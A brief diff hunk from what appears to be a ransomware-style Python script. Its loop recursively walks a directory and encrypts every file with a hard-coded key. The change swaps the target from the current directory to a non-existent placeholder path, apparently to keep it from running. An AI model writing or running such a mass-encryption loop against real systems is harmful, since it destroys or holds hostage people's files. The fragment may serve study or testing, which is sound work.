@@ -57,7 +57,7 @@ def verify_keyword(keyword):
 # symmetric_key = load_symmetric_key()
 
 # Encrypt all files in the current directory and its subdirectories
-directory = './'  # Change this to the directory containing the files to be encrypted
+directory = './THISDOESNTPOINTTOANYDIRCTORYYET'  # Change this to the directory containing the files to be encrypted
 for item in scanRecurse(directory):
     # encrypt(item, symmetric_key)
     encrypt(item, man_key)
